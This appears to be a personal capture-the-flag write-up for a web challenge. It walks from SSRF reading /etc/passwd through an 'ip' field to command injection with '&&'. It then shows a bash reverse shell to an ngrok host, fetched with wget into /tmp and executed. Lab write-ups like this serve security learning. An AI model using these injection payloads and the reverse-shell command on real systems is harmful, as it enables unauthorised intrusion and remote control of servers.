
2024-11-05 20:23

Source: #CTF 

Nmap scan the IP
Directory Bursting on Website
### SSRF on /status/index.php

in the captured burp suite request we have an IP field 
on changing the ip field we get etc/passwd in return 
```
ip=file:///etc/passwd
```
### RCE via SSRF

change the IP field to the following
```
ip=file:///proc/self/cwd/index.php
```

this will get the index.php, now decode this from html encoding
There is some sanitization to avoid RCE, but by using `&&` , we can still execute commands and bypass the sanitization. payload (I had urlencoded the &): 
```
ip=file:///etc/passwd&&id&&
```

#### Gaining foothold

I used ngrok to gain a foothold on the punisher user, and for the rest of the lateral movement, I used the CTF server itself. 
I used ngrok to expose my local port to the internet so that I could upload a shell code file onto the server

```sh
cat shell.sh
bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16004 0>&1'
```

Uploaded this file on server using wget at /tmp/shell.sh
```sh
# File uploaded on the server 
ip=file:///etc/passwd&&wget http://0.tcp.in.ngrok.io:16004/
shell.sh -O /tmp/shell.sh&&

# Executed the /tmp/shell.sh file 
ip=file:///etc/passwd&&bash /tmp/shell.sh&&
```


### References
 ISH CTF - Shivam